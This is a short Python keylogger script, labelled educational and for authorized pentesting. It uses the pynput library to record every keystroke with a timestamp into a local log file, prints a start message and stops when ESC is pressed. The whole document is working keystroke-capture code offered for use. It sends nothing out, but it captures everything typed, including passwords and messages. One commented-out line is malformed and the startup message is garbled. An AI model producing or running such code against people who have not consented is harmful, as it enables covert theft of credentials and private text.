#!/usr/bin/env python3
"""
Educational Keylogger - For authorized pentesting/learning purposes only.
Logs keystrokes to a text file in the same directory.
File runs as standalone
"""

from pynput import keyboard
from datetime import datetime
import os

# Log file path (same directory as script)
LOG_FILE = "keystrokes.log"

def on_press(key):
    """Callback function triggered on each key press."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        # Handle regular alphanumeric keys
        char = key.char
        log_entry = f"[{timestamp}] {char}\n"
    except AttributeError:
        # Handle special keys (Enter, Shift, Ctrl, etc.)
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL_L]",
            keyboard.Key.ctrl_r: "[CTRL_R]",
            keyboard.Key.alt_l: "[ALT_L]",
            keyboard.Key.alt_r: "[ALT_R]",
            keyboard.Key.caps_lock: "[CAPS_LOCK]",
            keyboard.Key.delete: "[DELETE]",
        }
        key_name = special_keys.get(key, f"[{key.name.upper()}]")
        log_entry = f"[{timestamp}] {key_name}\n"
    
    # Append to log file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

#def on_repr := repr(key) + "\n")

def on_release(key):
    """Optional: Stop listener on ESC (useful during testing)."""
    if key == keyboard.Key.esc:
        print("[*] Keylogger stopped.")
        return False  # Stop listener

def main():
    print(f"[*] Keylogger started keylogger... Logging to: {os.path.abspath(LOG_FILE)}")
    print("[*] Press ESC to stop.\n")
    
    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()